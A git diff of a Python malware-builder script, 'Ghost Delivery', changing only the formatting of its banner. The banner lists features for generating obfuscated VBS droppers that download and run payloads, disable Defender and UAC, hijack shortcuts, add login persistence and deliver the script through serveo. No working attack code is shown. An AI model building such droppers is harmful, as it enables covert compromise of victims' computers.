@@ -4,28 +4,29 @@ import random, sys, string, os, time, base64
 #Use for educational purposes, blah blah
 
 def gen_gd():
-		print("""
-		~G h o s t  D e l i v e r y~
+		print("""    
+			   	#GSH
+		     ~G h o s t  D e l i v e r y~
+		     
+	Tool designed to create a obfuscated .vbs script with two options:
 
-This tool is designed create a obfuscated .vbs script with two options:
-	
-	Heavy:
-	*Downloads payload to TEMP directory and executes payload
-	*Disables Defender
-	*Disables UAC
-	*Injects/creates Command Prompt and Microsoft Edge
-	shortcuts with payload path
-	*Adds scheduled task for payload to be run at login
-	*Obfuscates the vbs script
+		Heavy:
+		*Downloads payload to TEMP directory and executes payload
+		*Disables Defender
+		*Disables UAC
+		*Injects/creates Command Prompt and Microsoft Edge
+		shortcuts with payload path
+		*Adds scheduled task for payload to be run at login
+		*Obfuscates the vbs script
 
-	Light:
-	*Downloads payload to TEMP directory and executes payload
-	*Adds scheduled task for payload to be run at login
-	*Injects/creates Command Prompt and Microsoft Edge
-	shortcuts with payload path
-	*Obfuscates the vbs script
+		Light:
+		*Downloads payload to TEMP directory and executes payload
+		*Adds scheduled task for payload to be run at login
+		*Injects/creates Command Prompt and Microsoft Edge
+		shortcuts with payload path
+		*Obfuscates the vbs script
 
-This tool also has a serveo function to deliver obfuscated vbs script
+	This tool also has a serveo function to deliver obfuscated vbs script
 			""")
 
 def clear():
